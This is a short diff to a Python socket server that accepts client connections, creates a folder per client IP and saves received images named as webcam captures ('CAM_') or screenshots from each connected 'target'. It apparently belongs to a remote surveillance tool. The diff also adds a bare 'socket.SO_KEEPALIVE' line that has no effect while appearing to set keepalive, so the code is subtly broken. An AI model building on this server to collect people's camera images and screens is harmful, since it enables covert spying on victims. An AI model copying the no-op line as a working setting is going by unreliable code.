@@ -33,6 +33,7 @@ class Server:
                 self.__client_socket, self.__addr = self.get_server_socket().accept()
                 self.get_util().create_folder(self.get_client_ip())
                 self.get_client_socket().settimeout(10000)
+                socket.SO_KEEPALIVE
                 thread = threading.Thread(target=self.receiveTarget)
                 thread.start()
                 self.COUNT += 1
@@ -84,7 +85,6 @@ class Server:
             cv2.imwrite(self.get_util().get_save_path(self.get_client_ip()) + '\\' + f'CAM_{self.get_client_ip()}_{count}.jpg', decimg)
         else:
             cv2.imwrite(self.get_util().get_save_path(self.get_client_ip()) + '\\' + f'ScreenShot_{self.get_client_ip()}_{count}.jpg', decimg)
-        print('ok')
     
     def get_client_ip(self):
         return self.__addr[0]
@@ -106,3 +106,5 @@ class Server:
     
     def get_util(self):
         return self.__utility
+    
+
